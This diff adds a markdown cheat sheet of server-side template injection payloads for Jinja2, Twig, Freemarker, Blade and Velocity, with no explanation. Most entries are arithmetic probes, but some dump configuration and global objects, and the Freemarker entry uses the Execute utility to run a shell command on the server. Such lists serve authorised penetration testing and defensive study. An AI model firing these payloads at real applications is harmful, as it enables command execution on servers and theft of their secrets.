@@ -1,0 +1,24 @@
+# SSTI (Server Side Template Injection) Payloads
+
+## Jinja2
+{{7*7}}
+{{config}}
+{{request}}
+{{self.__init__.__globals__}}
+
+## Twig
+{{7*7}}
+{{_self.env.display}}
+{{dump(app)}}
+
+## Freemarker
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+
+## Blade
+{{7*7}}
+{{config}}
+{{ Illuminate\Support\Facades\DB::select('id') }}
+
+## Velocity
+#set($x=1+1)$x
